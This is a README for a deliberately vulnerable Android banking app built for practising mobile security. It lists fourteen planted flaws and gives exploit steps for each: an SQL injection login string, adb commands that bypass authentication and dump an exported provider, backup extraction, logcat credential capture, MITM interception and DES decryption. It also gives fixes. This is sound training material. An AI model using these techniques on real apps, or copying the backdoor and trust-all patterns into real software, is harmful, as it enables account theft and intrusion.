# VulnBank — Deliberately Vulnerable Android Banking App

A small, intentionally broken Android (Java) app for practicing mobile
reverse engineering and the **OWASP Mobile Top 10 (2024)**. Every
vulnerability is marked in the source with a `VULN` comment block
explaining the issue, its CWE, and the OWASP category.

**Do not ship this. Do not use real credentials in it. Local practice only.**

---

## 1. Build & run

Open the project root in Android Studio, let Gradle sync, run on an
emulator or device. Default accounts (seeded in `DatabaseHelper`):

| Username | Password | PIN |
|---|---|---|
| alice | alice123 | 1234 |
| bob | password1 | 4321 |

Backdoor login (see `Constants.java`): `admin` / `SuperSecret123!`

---

## 2. Vulnerability map

| # | File | OWASP Mobile | CWE | Issue |
|---|---|---|---|---|
| 1 | `Constants.java` | M1 Improper Credential Usage | CWE-798 | Hardcoded backdoor username/password |
| 2 | `Constants.java` | M10 Insufficient Cryptography | CWE-321 | Hardcoded DES key |
| 3 | `Constants.java`, `strings.xml` | M1 | CWE-798 | Hardcoded "API keys" in code and resources |
| 4 | `CryptoUtils.java` | M10 | CWE-327 | DES instead of AES, ECB mode (no IV) |
| 5 | `CryptoUtils.java` | M10 | CWE-330 | Predictable `java.util.Random` for IDs |
| 6 | `DatabaseHelper.java` | M9 Insecure Data Storage | CWE-312 | Passwords stored in plaintext in SQLite |
| 7 | `DatabaseHelper.java` | M4 Insufficient Input Validation | CWE-89 | SQL injection in `login()` |
| 8 | `AccountProvider.java` + manifest | M1 | CWE-926 | Exported ContentProvider, no permission check |
| 9 | `BalanceActivity.java` + manifest | M1 | CWE-862 | Exported Activity, auth check missing (broken access control) |
| 10 | `LoginActivity.java` | M1/M9 | CWE-312/532 | Credentials written to Logcat |
| 11 | `SessionManager.java` | M9 | CWE-312 | Plaintext password in SharedPreferences |
| 12 | `TrustAllManager.java` + `network_security_config.xml` | M5 Insecure Communication | CWE-295 | Cleartext traffic allowed + certificate validation disabled |
| 13 | `AndroidManifest.xml` | M8 Security Misconfiguration | CWE-919 | `allowBackup="true"`, debuggable build type |
| 14 | `app/build.gradle` | M7 Insufficient Binary Protections | — | No ProGuard/R8 minification or obfuscation |

---

## 3. How to exploit each one (static + dynamic)

### Static (no device needed)
```bash
unzip VulnBank.apk -d out
jadx-gui out/base.apk          # or: jadx out/base.apk -d jadx_out
```
- Search for `DES_KEY`, `ADMIN_BACKDOOR`, `sk_live`, `sk_support` — all plaintext.
- Open `LoginActivity` → see the backdoor check and the raw SQL string building.
- Open `AndroidManifest.xml` in jadx → note `exported="true"` on `BalanceActivity` and `AccountProvider`, and `allowBackup="true"`.

### Dynamic — broken access control (#9)
```bash
adb shell am start -n com.vulnbank.app/.BalanceActivity --es username alice
```
Shows alice's balance and decrypted PIN without ever hitting the login screen.

### Dynamic — exported provider (#8)
```bash
adb shell content query --uri content://com.vulnbank.app.provider/users
```
Dumps every username, plaintext password, and encrypted PIN.

### Dynamic — SQL injection (#7)
In the login form:
```
Username: ' OR '1'='1' --
Password: anything
```

### Dynamic — plaintext data via backup (#6, #11, #13)
```bash
adb backup -f backup.ab com.vulnbank.app
# unpack with abe/android-backup-extractor, then:
sqlite3 databases/vulnbank.db "select * from users;"
cat shared_prefs/session.xml
```

### Dynamic — logcat leak (#10)
```bash
adb logcat | grep "VulnBank/Login"
```
Type any credentials into the login form on the device, watch them appear.

### Dynamic — MITM (#12)
Point the emulator at Burp Suite's proxy and install Burp's CA, or just run
mitmproxy — since `usesCleartextTraffic="true"` and `TrustAllManager` accepts
any cert, every request (and the API key in the header) is visible and
can be tampered with.

### Weak crypto (#4, #5)
Decrypt any `pin_encrypted` value yourself in Python once you know it's DES/ECB:
```python
from Crypto.Cipher import DES
from Crypto.Util.Padding import unpad
import base64
key = b"8bytekey"
ct = base64.b64decode("<value from the DB>")
pt = DES.new(key, DES.MODE_ECB).decrypt(ct)
print(unpad(pt, 8))
```

---

## 4. Fixing each vulnerability (do this as a second pass)

| Issue | Fix |
|---|---|
| Hardcoded secrets | Remove from source; fetch from a backend after auth, or use Android Keystore-backed storage |
| DES/ECB | AES-256-GCM, random IV per encryption, key from Android Keystore |
| Predictable IDs | `java.security.SecureRandom` |
| Plaintext DB fields | Hash passwords (bcrypt/Argon2, never reversible), encrypt sensitive columns |
| SQL injection | Parameterized queries only (`db.rawQuery(sql, args)` or `SQLiteQueryBuilder`) |
| Exported provider/activity | `android:exported="false"` unless truly needed by other apps; if needed, add `android:permission` and still re-check auth in code |
| Auth bypass on direct launch | Check `SessionManager.isLoggedIn()` at the top of every sensitive `onCreate()` |
| Logcat leaks | Never log credentials/tokens; strip debug logs from release builds |
| Plaintext SharedPreferences | `androidx.security.crypto.EncryptedSharedPreferences` |
| Cleartext traffic / no pinning | `usesCleartextTraffic="false"`, remove `TrustAllManager`, add certificate/public-key pinning |
| `allowBackup`, debuggable | `allowBackup="false"`, `debuggable` only in debug builds, never in release |
| No obfuscation | Enable R8/ProGuard (`minifyEnabled true`) for release builds |

---

## 5. Suggested study flow

1. Build the app, log in normally, confirm it "works."
2. Pick one `VULN` comment at a time (top to bottom in the table above).
3. Exploit it using the steps in section 3.
4. Apply the fix from section 4, rebuild, confirm the exploit no longer works.
5. Write a short note per vulnerability (cause → exploit → fix → CWE/OWASP ref) — this becomes your personal mobile-AppSec notebook / future writeup material.
